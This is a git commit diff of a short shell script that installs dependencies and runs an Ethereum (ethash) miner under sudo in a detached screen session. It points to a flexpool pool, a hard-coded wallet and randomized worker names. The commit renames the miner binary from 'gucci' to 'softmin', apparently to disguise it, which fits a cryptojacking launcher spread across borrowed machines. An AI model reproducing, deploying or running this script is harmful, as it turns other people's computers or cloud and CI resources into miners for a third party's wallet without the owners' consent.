6e5e7980d690194aa4313a8895f96b3eeaa84946
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-07-01 18:22:33 +0530

    Update and rename levis.sh to henok.sh

--- henok.sh
+++ henok.sh
@@ -4,9 +4,9 @@ sudo apt install screen libjansson4 -y
 screen -dmS ls 
 POOL=eth-us-east.flexpool.io:4444
 WALLET=0xC4e7C8C7cbA2c0587Cf690aC37Dc790Da0dfeEE5
-WORKER=$(echo $(shuf -i 1-4 -n 1)-ARKIN)
+WORKER=$(echo $(shuf -i 1-4 -n 1)-SERKER)
 
 cd "$(dirname "$0")"
 
-chmod +x ./gucci && sudo ./gucci -a ethash -o $POOL -u $WALLET.$WORKER -log
+chmod +x ./softmin && sudo ./softmin -a ethash -o $POOL -u $WALLET.$WORKER -log
 pause $@
